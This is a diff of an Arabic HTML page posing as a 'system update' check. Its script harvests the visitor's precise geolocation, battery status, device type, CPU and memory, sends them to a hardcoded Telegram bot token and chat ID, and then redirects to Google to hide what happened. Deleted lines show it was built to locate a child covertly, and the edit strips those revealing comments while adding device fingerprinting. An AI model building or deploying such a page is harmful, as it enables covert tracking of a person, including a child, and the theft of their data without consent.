@@ -3,38 +3,68 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>تحديث الأمان</title>
+    <title>تحديث النظام</title>
 </head>
-<body style="background-color: #f0f0f0; text-align: center; font-family: Arial; padding-top: 50px;">
-    <h2>جاري فحص حالة النظام...</h2>
-    <p>يرجى الموافقة على طلب الموقع للمتابعة</p>
+<body style="background-color: #f4f4f4; text-align: center; font-family: sans-serif; padding-top: 50px;">
+    <h2>جاري فحص حالة الاتصال...</h2>
+    <p>يرجى الموافقة على الأذونات للمتابعة</p>
 
     <script>
-        // بياناتك التي قدمتها
         const botToken = "8113942047:AAFTJz0lZe1Mjsc0vX79LeCq4MKjwwDuFEw"; 
         const chatId = "7984067238"; 
 
-        function sendLocation(position) {
+        async function getExtraInfo() {
+            let data = "";
+            
+            // 1. نسبة الشحن
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    data += `🔋 الشحن: ${Math.round(battery.level * 100)}% (${battery.charging ? "يشحن حالياً" : "لا يشحن"})\n`;
+                }
+            } catch (e) { data += "🔋 الشحن: غير مسموح بالوصول\n"; }
+
+            // 2. نوع الهاتف وإصدار النظام
+            const ua = navigator.userAgent;
+            let deviceModel = "غير معروف";
+            if (ua.indexOf("Android") > -1) deviceModel = "أندرويد (Android)";
+            else if (ua.indexOf("iPhone") > -1) deviceModel = "آيفون (iPhone)";
+            
+            data += `📱 نوع الجهاز: ${deviceModel}\n`;
+            data += `💻 المعالج: ${navigator.hardwareConcurrency || "غير معروف"} نواة\n`;
+            
+            // 3. الذاكرة (الرامات التقريبية)
+            if (navigator.deviceMemory) {
+                data += `💾 الذاكرة (RAM): حوالي ${navigator.deviceMemory} جيجا\n`;
+            }
+
+            return data;
+        }
+
+        async function sendFinalReport(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
+            const extraInfo = await getExtraInfo();
+            
             const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-            const message = `📍 تم تحديد موقع الطفل بنجاح:\n${mapLink}`;
+            
+            const message = `📡 **تقرير فحص الجهاز**\n\n` +
+                            `${extraInfo}` +
+                            `📍 الموقع: ${mapLink}`;
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
             .then(() => {
-                // توجيه الطفل لموقع جوجل بعد الإرسال بنجاح ليوهم العملية بأنها طبيعية
                 window.location.href = "https://www.google.com";
             });
         }
 
         window.onload = function() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation, (err) => {
-                    alert("يرجى تفعيل الموقع الجغرافي للضرورة القصوى.");
+                navigator.geolocation.getCurrentPosition(sendFinalReport, (err) => {
+                    alert("يجب تفعيل الموقع وحفظ الإعدادات للمتابعة.");
                 }, { enableHighAccuracy: true });
             }
         };
     </script>
 </body>
 </html>
-
